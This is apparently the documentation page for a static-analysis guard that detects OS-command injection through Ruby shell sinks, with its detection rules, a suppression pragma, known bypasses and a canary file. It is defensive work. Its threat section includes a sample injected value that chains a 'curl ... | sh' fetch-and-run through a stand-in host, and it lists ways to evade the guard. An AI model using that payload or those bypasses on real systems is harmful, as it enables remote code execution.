---
type: Guard
title: "ruby-command-injection"
description: "No OS-command injection via a Ruby shell sink built from a dynamic command string."
timestamp: "2026-09-11T00:00:00Z"
guard_id: "ruby-command-injection"
checklist_section: ["3b"]
standards: ["OWASP:A03", "OWASP-LLM:LLM05"]
---

# No OS-command injection via a shell sink (Ruby)

Flags Ruby shell sinks whose command string is interpolated or concatenated rather than a static
literal. Extends checklist item `3b-command-injection` — the Ruby counterpart to the existing
`command-injection` (Python) and `js-command-injection` (JS/TS) guards, widening the same
checklist item rather than duplicating it (brakeman research batch). OWASP:A03,
OWASP-LLM:LLM05, CWE-78.

## The threat

`system("systemctl restart #{service}")` with `service = "nginx; curl evil.sh | sh"` is remote
code execution on the host. Ruby's `Kernel#system` / `Kernel#exec`, backtick execution, `%x{}`,
`IO.popen` and `Open3` all hand a **single string** to `/bin/sh` when they receive one, so every
shell metacharacter in that string is live: `;`, `|`, `&&`, `$( )`, backticks, newline. This is
the sibling of SQL injection for the OS shell, and a top agent-tool risk — a Ruby tool that shells
out turns one prompt injection into host RCE.

## Exploitability rationale

CRITICAL. It is direct, unauthenticated-if-the-input-is-unauthenticated code execution as the
application user, with no memory-corruption skill required and a one-line payload. Likelihood is
high in Ruby specifically: interpolation is the language's most reflexive idiom, `system "..."`
reads like shell script, and the safe argv form is a *different* call shape rather than a keyword
argument you can forget to set (Python's `shell=True`), so the safe path is the one a developer
has to know about in advance.

## What counts as a hit (and what doesn't)

- **The sinks.** `system(...)` / `exec(...)` as barewords and with the `Kernel.`/`Process.`
  receivers, with or without parentheses (`system "rake #{task}"` is idiomatic); backtick
  execution `` `...` ``; `%x{...}` / `%x(...)` / `%x[...]` / `%x<...>` / `%x|...|`;
  `Open3.popen2` / `popen2e` / `popen3` / `capture2` / `capture2e` / `capture3`; `IO.popen(...)`.
- **The trigger is the FIRST argument being a dynamic string**: a double-quoted literal
  containing `#{...}`, or any expression concatenating a string literal with `+`
  (`"git clone " + url` **and** `clone_cmd + " --depth 1"` — both directions).
- **The argv form is the fix and stays silent.** `system(["ping", host])`,
  `system("ping", "-c", "1", host)`, `IO.popen(["ls", dir])`,
  `Open3.capture3("git", "clone", url)` — none of those hand a string to a shell, and none of
  them has a dynamic *string* first argument, so the same rule that fires on the shell form is
  silent on the safe one. This is the Ruby equivalent of `subprocess.run([...])` without
  `shell=True`.
- **`IO.popen` is not treated as argv-by-arity.** Its second argument is a file MODE (`"r"`), not
  an argv element, so `IO.popen("ls #{dir}", "r")` fires. Only the array first argument is safe
  there.
- Ruby single quotes do not interpolate, so `system('echo #{x}')` is a static literal and stays
  silent.

## When NOT to flag (and the pragma)

- `system("ping", "-c", "1", host)` / `system(["ping", host])` → silent (the fix).
- `conn.exec("SELECT ... #{id}")` → silent. `PG::Connection#exec` is a database call, not
  `Kernel#exec`; the receiver dot is what tells them apart. (That query is its own SQL-injection
  problem — a different guard's job, not this one's.)
- `def exec(cmd)` — an application defining its own method of that name → silent.
- Commented out (`# system("rm -rf #{path}")`, or inside a `=begin`/`=end` block) → silent.
- `spec/`, `test/`, `fixtures/`, `examples/` trees are not scanned for this check — a planted
  example or a `system("rspec #{file}")` test helper is not a product finding.
- An audited-safe call → suppress explicitly:

```ruby
system("rake #{task}")  # security: allow-shell-exec
```

The pragma token is shared with the Python `command-injection` guard on purpose: one opt-out per
requirement, not one per language.

## Known bypasses (honest limits)

- **A bare variable is a deliberate false negative.** `system(cmd)` does not fire. In Ruby that
  variable may equally hold the *safe* argv array (`cmd = ["ls", dir]`), which is not true of the
  Python sibling's `os.system(cmd)` — so firing on it would be a guess in both directions. Command
  strings assembled on a previous line and passed by name are not traced; there is no dataflow
  here.
- **Single-line, textual.** A call split across lines, or a command built up over several
  statements, is not reassembled. Same textual scope as `command_injection.py`.
- **`sh -c` inside an argv array is not unwrapped.** `system(["sh", "-c", "ls " + dir])` reads as
  the safe array form to this guard even though it re-introduces a shell. Documented rather than
  silently assumed away.
- **Heredocs and `%w[]` percent-literals are not comment-aware.** `strip_ruby_comments`
  deliberately does not track those forms, so a sink written inside a heredoc body is not
  correctly recognised as "inside a string".
- **Interpolation inside a backtick / `%x{}` literal is matched on the RAW line**, because the
  comment stripper reads the `#` of `#{` inside a backtick as a comment start. A position check
  against the stripped line is what keeps a commented-out backtick example silent; a backtick
  literal nested inside a double-quoted string could in principle still be read as a sink.

## What this guard does NOT prove

A clean scan means no shell sink with a dynamic command string was found in the scanned Ruby
source. It says nothing about a command executed through a gem that wraps `Process.spawn` or a
native extension, a shell string reaching the sink through several layers of indirection, or a
command whose argv array is itself fully attacker-controlled.

## Canary plant

`deploy.rb` — `system("systemctl restart #{service}")` inside a method body, no pragma. Expected
rule: `ruby-command-injection/shell-exec-untrusted`.

# Citations

[1] agentsec checklist item `3b-command-injection` (§3b)
[2] OWASP:A03 (Injection); OWASP-LLM:LLM05
[3] CWE-78 (Improper Neutralization of Special Elements used in an OS Command)
[4] Brakeman `lib/brakeman/checks/check_execute.rb` (`Brakeman::CheckExecute`) — pattern
    provenance only; detection logic and fixtures here are original
